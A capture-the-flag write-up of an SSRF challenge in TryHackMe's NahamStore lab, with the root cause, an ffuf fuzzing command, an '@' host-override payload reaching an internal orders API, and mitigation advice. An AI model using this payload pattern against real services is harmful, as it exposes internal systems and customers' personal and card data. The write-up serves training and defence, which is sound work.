# Challenge Name: NahamStore | Task 9
# Platform: TryHackMe
# Difficulty: Medium

## 1. Vulnerability Type
SSRF (Server Side Request Forgery)
## 2. Root Cause
The application constructs backend HTTP requests using user-supplied input (server parameter) without proper validation or hostname enforcement. This allows attackers to override the intended host and access internal services.
## 3. Attack Surface
`/stockcheck`
POST `product_id=1&server=stock.nahamstore.thm@internal-api.nahamstore.thm`
Because URLs follow `scheme://username@hostname` format `stock.nahamstore.thm` is treated like username and `internal-api.nahamstore.thm` is treated like actual host.
## 4. Exploit Method
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://nahamstore.thm/stockcheck/" -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -X POST -d "product_id=1&server=stock.nahamstore.thm@FUZZ.nahamstore.thm#" -t 64 -ac
```
## 5. Payload / Technique
`product_id=1&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c#`
## 6. Impact
Unauthorized access to PII (Personally Identifiable Information) such as email, address, card number

## 7. Reusable Pattern
An attacker can access internal API endpoints not exposed publicly, potentially retrieving sensitive user data such as emails, addresses, and payment information. In a real-world scenario, this could lead to data breaches, compliance violations, and financial loss.
## 8. Key Takeaway
* Enforce strict hostname allowlist (`stock.nahamstore.thm`)
* Block access to: `localhost`, `127.0.0.1`, etc.
* Avoid directly passing user input into backend requests
